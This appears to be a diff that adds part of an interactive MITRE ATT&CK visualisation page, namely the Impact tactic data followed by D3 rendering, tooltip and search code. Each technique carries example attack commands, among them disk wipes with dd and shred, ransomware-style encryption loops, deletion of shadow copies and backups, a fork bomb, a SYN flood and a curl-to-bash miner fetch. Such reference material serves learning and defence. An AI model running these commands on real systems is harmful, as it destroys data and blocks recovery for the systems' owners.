+ {id:"TA0040",name:"Impact",color:"#ef233c",desc:"Manipulate, interrupt, or destroy systems and data.",
+  techs:[
+   {id:"T1531",name:"Account Access Removal",desc:"Lock/delete accounts to deny legitimate access.",
+    sub:[],cmds:[{c:"userdel -r admin && passwd -l sysadmin",n:"Delete/lock Linux accounts"},{c:"net user admin /active:no",n:"Disable Windows account"}]},
+   {id:"T1485",name:"Data Destruction",desc:"Permanently destroy data on storage.",
+    sub:[{id:".001",name:"Lifecycle-Triggered Deletion"}],
+    cmds:[{c:"shred -uzn 7 /sensitive/* && sync",n:"7-pass secure wipe"},{c:"dd if=/dev/urandom of=/dev/sda bs=4M status=progress",n:"Overwrite entire disk"},{c:"wipe -rfi /data/",n:"Recursive secure directory wipe"}]},
+   {id:"T1486",name:"Data Encrypted for Impact",desc:"Ransomware: encrypt files to extort payment.",
+    sub:[{id:".001",name:"Symmetric Encryption"},{id:".002",name:"Asymmetric Encryption"}],
+    cmds:[{c:"find /data -type f | xargs -I{} openssl enc -aes-256-cbc -in {} -out {}.enc -k KEY",n:"Simulate ransomware encryption"},{c:"for f in $(find /target -type f); do gpg --batch -c $f && rm $f; done",n:"GPG symmetric encryption sweep"}]},
+   {id:"T1565",name:"Data Manipulation",desc:"Modify data to impact integrity/availability.",
+    sub:[{id:".001",name:"Stored Data Manipulation"},{id:".002",name:"Transmitted Data Manipulation"},{id:".003",name:"Runtime Data Manipulation"}],
+    cmds:[{c:"# Modify financial database records",n:"Database record manipulation"},{c:"# Flip bits in transmitted data via MITM",n:"In-transit data manipulation"}]},
+   {id:"T1491",name:"Defacement",desc:"Modify visual content of websites.",
+    sub:[{id:".001",name:"Internal Defacement"},{id:".002",name:"External Website Defacement"}],
+    cmds:[{c:"echo '<h1>Hacked</h1>' > /var/www/html/index.html",n:"Simple web defacement"},{c:"# Replace internal SharePoint homepage",n:"Internal portal defacement"}]},
+   {id:"T1561",name:"Disk Wipe",desc:"Overwrite disk/partition to destroy data.",
+    sub:[{id:".001",name:"Disk Content Wipe"},{id:".002",name:"Disk Structure Wipe"}],
+    cmds:[{c:"dd if=/dev/zero of=/dev/sda",n:"Zero-fill entire disk"},{c:"# MBKILLER: overwrite MBR to prevent boot",n:"MBR destruction"}]},
+   {id:"T1499",name:"Endpoint Denial of Service",desc:"Overwhelm endpoint resources.",
+    sub:[{id:".001",name:"OS Exhaustion Flood"},{id:".002",name:"Service Exhaustion Flood"},{id:".003",name:"Application Exhaustion Flood"},{id:".004",name:"Application or System Exploitation"}],
+    cmds:[{c:"stress-ng --cpu 0 --cpu-method all --timeout 60s",n:"Max all CPU cores"},{c:":(){ :|:& };:  # fork bomb",n:"Fork bomb: process exhaustion"},{c:"dd if=/dev/zero of=/tmp/fill bs=1M  # fill disk",n:"Disk fill DoS"}]},
+   {id:"T1657",name:"Financial Theft",desc:"Steal money via business email compromise, crypto theft.",
+    sub:[],cmds:[{c:"# BEC: intercept wire transfer email and change account",n:"Business email compromise"},{c:"# Drain crypto wallet via stolen private key",n:"Cryptocurrency theft"}]},
+   {id:"T1495",name:"Firmware Corruption",desc:"Corrupt firmware to render device unusable.",
+    sub:[],cmds:[{c:"# Flash corrupted BIOS image to brick device",n:"BIOS/UEFI corruption"},{c:"# Overwrite NIC firmware via msfvenom -p firmware",n:"NIC firmware corruption"}]},
+   {id:"T1490",name:"Inhibit System Recovery",desc:"Delete backups and recovery mechanisms.",
+    sub:[],cmds:[{c:"vssadmin delete shadows /all /quiet",n:"Delete all VSS snapshots"},{c:"wbadmin delete catalog -quiet && bcdedit /set {default} recoveryenabled No",n:"Delete Windows backup catalog"},{c:"rm -rf /var/backup/* /backup/* /.snapshots/*",n:"Delete Linux backup directories"}]},
+   {id:"T1498",name:"Network Denial of Service",desc:"Flood network to deny availability.",
+    sub:[{id:".001",name:"Direct Network Flood"},{id:".002",name:"Reflection Amplification"}],
+    cmds:[{c:"hping3 -S --flood -V -p 80 target.com",n:"SYN flood test"},{c:"# NTP amplification: monlist reflection attack",n:"NTP amplification DDoS"}]},
+   {id:"T1496",name:"Resource Hijacking",desc:"Hijack resources for crypto mining or spam.",
+    sub:[{id:".001",name:"Compute Hijacking"},{id:".002",name:"Bandwidth Hijacking"},{id:".003",name:"SMS Pumping"}],
+    cmds:[{c:"# Deploy XMRig cryptominer to hijack CPU",n:"Cryptomining deployment"},{c:"curl -s https://raw.githubusercontent.com/xmrig/xmrig/master/build/xmrig | bash",n:"XMRig miner from URL"}]},
+   {id:"T1489",name:"Service Stop",desc:"Stop or disable critical services.",
+    sub:[],cmds:[{c:"systemctl stop apache2 mysql postgresql && systemctl disable apache2",n:"Stop and disable web/DB services"},{c:"net stop 'SQL Server (MSSQLSERVER)' && sc config MSSQLSERVER start=disabled",n:"Windows SQL Server stop"}]},
+   {id:"T1529",name:"System Shutdown/Reboot",desc:"Shut down or reboot systems to disrupt availability.",
+    sub:[],cmds:[{c:"shutdown -h now && halt",n:"Immediate Linux shutdown"},{c:"shutdown /s /f /t 0",n:"Immediate Windows shutdown"}]},
+  ]},
+];
+
+// ════════════════════════════════════════════════════════════════════════════
+// ═══ SECTION: D3 RENDERER ═══════════════════════════════════════════════════
+// Modify tree layout, node sizes, zoom behavior here
+//
+// BUILD D3 RADIAL TREE
+// ════════════════════════════════════════════════════════════════════════════
+const W=window.innerWidth, H=window.innerHeight;
+
+// Flatten to hierarchy: root → tactic → technique → sub-technique
+const root_d={id:"root",name:"ATT·CK",type:"root",children:DATA.map(t=>({
+  id:t.id, name:t.name, color:t.color, type:"tactic", desc:t.desc,
+  children:t.techs.map(te=>({
+    id:te.id, name:te.name, color:t.color, type:"technique",
+    tactic:t.name, tacticId:t.id, desc:te.desc, cmds:te.cmds||[], mits:te.mits||[],
+    children:(te.sub||[]).map(s=>({
+      id:s.id, name:s.name, color:t.color, type:"subtechnique",
+      tactic:t.name, parentId:te.id, parentName:te.name
+    }))
+  }))
+}))};
+
+const svg=d3.select("#svg").attr("width",W).attr("height",H);
+const g=svg.append("g").attr("transform",`translate(${W/2},${H/2})`);
+
+const zoom=d3.zoom().scaleExtent([.08,4])
+  .on("zoom",e=>g.attr("transform",e.transform.translate(W/2,H/2)));
+svg.call(zoom);
+
+const tree=d3.tree().size([2*Math.PI, Math.min(W,H)*.42])
+  .separation((a,b)=>( a.parent===b.parent ? (a.depth>1?0.65:1) : (a.depth>1?1.2:2) )/a.depth);
+
+const hier=d3.hierarchy(root_d);
+tree(hier);
+
+const linkGen=d3.linkRadial().angle(d=>d.x).radius(d=>d.y);
+
+g.selectAll(".link").data(hier.links()).join("path")
+  .attr("class","link").attr("d",linkGen)
+  .attr("stroke",d=>d.target.data.color||"#334")
+  .attr("stroke-width",d=>d.target.depth===1?1.8:d.target.depth===2?.9:.5)
+  .attr("stroke-dasharray",d=>d.target.depth===3?"3,3":"none");
+
+const node=g.selectAll(".node").data(hier.descendants()).join("g")
+  .attr("class","node")
+  .attr("transform",d=>`rotate(${d.x*180/Math.PI-90}) translate(${d.y},0)`)
+  .on("click",(e,d)=>{e.stopPropagation();showTT(d.data)});
+
+// ROOT
+node.filter(d=>d.depth===0).append("circle")
+  .attr("r",42).attr("fill","#060e20")
+  .attr("stroke","#00c8ff").attr("stroke-width",2.5)
+  .style("filter","drop-shadow(0 0 20px #00c8ff88)");
+node.filter(d=>d.depth===0).append("text")
+  .attr("text-anchor","middle").attr("dy","-.1em")
+  .attr("font-size","12px").attr("font-weight","900")
+  .attr("fill","#00c8ff").attr("font-family","Orbitron,monospace").text("MITRE");
+node.filter(d=>d.depth===0).append("text")
+  .attr("text-anchor","middle").attr("dy","1.1em")
+  .attr("font-size","12px").attr("font-weight","900")
+  .attr("fill","#00c8ff").attr("font-family","Orbitron,monospace").text("ATT·CK");
+node.filter(d=>d.depth===0).append("text")
+  .attr("text-anchor","middle").attr("dy","2.5em")
+  .attr("font-size","7px").attr("fill","rgba(0,200,255,.45)")
+  .attr("font-family","Share Tech Mono,monospace").text("v18.1");
+
+// TACTICS
+const tNode=node.filter(d=>d.depth===1);
+tNode.append("circle").attr("r",22)
+  .attr("fill",d=>d.data.color+"28")
+  .attr("stroke",d=>d.data.color).attr("stroke-width",2)
+  .style("filter",d=>`drop-shadow(0 0 7px ${d.data.color}88)`);
+tNode.each(function(d){
+  const el=d3.select(this), ang=d.x*180/Math.PI-90;
+  const isR=(ang>-90&&ang<90), words=d.data.name.split(/\s+/);
+  words.forEach((w,i)=>{
+    el.append("text")
+      .attr("transform",`rotate(${isR?0:180})`)
+      .attr("text-anchor","middle")
+      .attr("dy",`${(i-(words.length-1)/2)*1.05+.35}em`)
+      .attr("font-size",words.length>2?"6.8px":"7.8px").attr("font-weight","700")
+      .attr("fill","#fff").attr("font-family","Rajdhani,sans-serif").text(w);
+  });
+});
+
+// TECHNIQUES
+const teNode=node.filter(d=>d.depth===2);
+teNode.append("circle").attr("r",5)
+  .attr("fill",d=>d.data.color+"55")
+  .attr("stroke",d=>d.data.color).attr("stroke-width",1.5)
+  .style("filter",d=>`drop-shadow(0 0 4px ${d.data.color}66)`);
+teNode.each(function(d){
+  const el=d3.select(this), ang=d.x*180/Math.PI-90;
+  const isR=(ang>-90&&ang<90);
+  el.append("text")
+    .attr("transform",`rotate(${isR?0:180})`)
+    .attr("text-anchor",isR?"start":"end")
+    .attr("dx",isR?9:-9).attr("dy",".32em")
+    .attr("font-size","7px").attr("font-family","Rajdhani,sans-serif")
+    .attr("fill",d=>d.data.color)
+    .attr("stroke","#03050f").attr("stroke-width","3px")
+    .text(d=>`${d.data.id} ${d.data.name}`);
+});
+
+// SUB-TECHNIQUES
+const sNode=node.filter(d=>d.depth===3);
+sNode.append("circle").attr("r",2.8)
+  .attr("fill",d=>d.data.color+"80")
+  .attr("stroke",d=>d.data.color+"aa").attr("stroke-width",.8);
+sNode.each(function(d){
+  const el=d3.select(this), ang=d.x*180/Math.PI-90;
+  const isR=(ang>-90&&ang<90);
+  el.append("text")
+    .attr("transform",`rotate(${isR?0:180})`)
+    .attr("text-anchor",isR?"start":"end")
+    .attr("dx",isR?6:-6).attr("dy",".32em")
+    .attr("font-size","5.5px").attr("font-family","Share Tech Mono,monospace")
+    .attr("fill",d=>d.data.color+"bb")
+    .attr("stroke","#03050f").attr("stroke-width","2.5px")
+    .text(d=>`${d.data.parentId}${d.data.id} ${d.data.name}`);
+});
+
+// ════════════════════════════════════════════════════════════════════════════
+// ═══ SECTION: TOOLTIP ══════════════════════════════════════════════════════
+// Modify panel content, styling logic here
+//
+// TOOLTIP
+// ════════════════════════════════════════════════════════════════════════════
+function esc(s){return(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>')}
+
+function showTT(data){
+  if(data.type==='root')return;
+  const tt=document.getElementById('tt');
+  document.getElementById('tth').style.borderBottomColor=(data.color||'#00c8ff')+'55';
+  document.getElementById('ttid').textContent=data.id||'';
+  const titleEl=document.getElementById('tttitle');
+  titleEl.textContent=data.name; titleEl.style.color=data.color||'#00c8ff';
+  let html='';
+
+  if(data.type==='tactic'){
+    html+=`<div class="ts"><div class="tl">◈ Description</div><div class="td">${esc(data.desc)}</div></div>`;
+    const techs=DATA.find(t=>t.id===data.id)?.techs||[];
+    html+=`<div class="ts"><div class="tl">◈ Techniques (${techs.length})</div>`;
+    techs.forEach(te=>{
+      html+=`<div class="tsub"><span class="tsub-id" style="color:${data.color}">${te.id}</span><span class="tsub-name">${te.name}</span></div>`;
+    });
+    html+='</div>';
+  } else if(data.type==='technique'){
+    html+=`<div class="ts"><div class="tl">◈ Tactic</div><div class="td" style="color:${data.color}">${data.tactic}</div></div>`;
+    html+=`<div class="ts"><div class="tl">◈ Description</div><div class="td">${esc(data.desc)}</div></div>`;
+    if(data.cmds&&data.cmds.length){
+      html+=`<div class="ts"><div class="tl">◈ Commands (${data.cmds.length})</div>`;
+      data.cmds.forEach(c=>{
+        html+=`<div class="tc">${esc(c.c)}</div>`;
+        if(c.n) html+=`<div class="tn">${esc(c.n)}</div>`;
+      });
+      html+='</div>';
+    }
+    // Sub-techniques listed
+    const tData=DATA.find(t=>t.id===data.tacticId)?.techs?.find(te=>te.id===data.id);
+    if(tData?.sub&&tData.sub.length){
+      html+=`<div class="ts"><div class="tl">◈ Sub-techniques (${tData.sub.length})</div>`;
+      tData.sub.forEach(s=>{
+        html+=`<div class="tsub"><span class="tsub-id" style="color:${data.color}">${data.id}${s.id}</span><span class="tsub-name">${s.name}</span></div>`;
+      });
+      html+='</div>';
+    }
+  } else if(data.type==='subtechnique'){
+    html+=`<div class="ts"><div class="tl">◈ Parent Technique</div><div class="td" style="color:${data.color}">${data.parentId} ${data.parentName}</div></div>`;
+    html+=`<div class="ts"><div class="tl">◈ Tactic</div><div class="td">${data.tactic}</div></div>`;
+    html+=`<div class="ts"><div class="tl">◈ Full ID</div><div class="td" style="color:${data.color};font-family:Share Tech Mono,monospace">${data.parentId}${data.id}</div></div>`;
+  }
+
+  document.getElementById('ttb').innerHTML=html;
+  tt.style.display='block';
+}
+
+function closeTT(){document.getElementById('tt').style.display='none';}
+svg.on("click",closeTT);
+
+// ════════════════════════════════════════════════════════════════════════════
+// ═══ SECTION: SEARCH ═══════════════════════════════════════════════════════
+// Modify search filter logic here
+//
+// SEARCH
+// ════════════════════════════════════════════════════════════════════════════
+function doSearch(q){
+  q=q.toLowerCase().trim();
+  if(!q){
+    g.selectAll(".node").style("opacity",1);
+    return;
+  }
+  g.selectAll(".node").style("opacity",function(d){
+    if(d.depth===0)return 1;
+    const id=(d.data.id||'').toLowerCase();
+    const name=(d.data.name||'').toLowerCase();
+    if(id.includes(q)||name.includes(q))return 1;
+    if(d.depth===3){
+      const full=(d.data.parentId+(d.data.id||'')).toLowerCase();
+      if(full.includes(q))return 1;
+    }
+    return.08;
+  });
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// ═══ SECTION: CONTROLS ═════════════════════════════════════════════════════
+// Zoom reset / overview buttons
+//
+// CONTROLS
+// ════════════════════════════════════════════════════════════════════════════
+function resetZoom(){svg.transition().duration(600).call(zoom.transform,d3.zoomIdentity);}
+function zoomTo(s){svg.transition().duration(600).call(zoom.transform,d3.zoomIdentity.scale(s));}
+
+// ════════════════════════════════════════════════════════════════════════════
+// ═══ SECTION: LEGEND ═══════════════════════════════════════════════════════
+// Bottom tactic legend bar
+//
+// LEGEND
+// ════════════════════════════════════════════════════════════════════════════
+const leg=document.getElementById('leg');
+DATA.forEach(t=>{
+  const el=document.createElement('div');
+  el.className='li';
+  el.innerHTML=`<div class="ld" style="background:${t.color}"></div>${t.name}`;
+  el.onclick=()=>{const d=hier.descendants().find(n=>n.data.id===t.id);if(d)showTT(d.data);};
+  leg.appendChild(el);
+});
+</script>
+</body>
+</html>
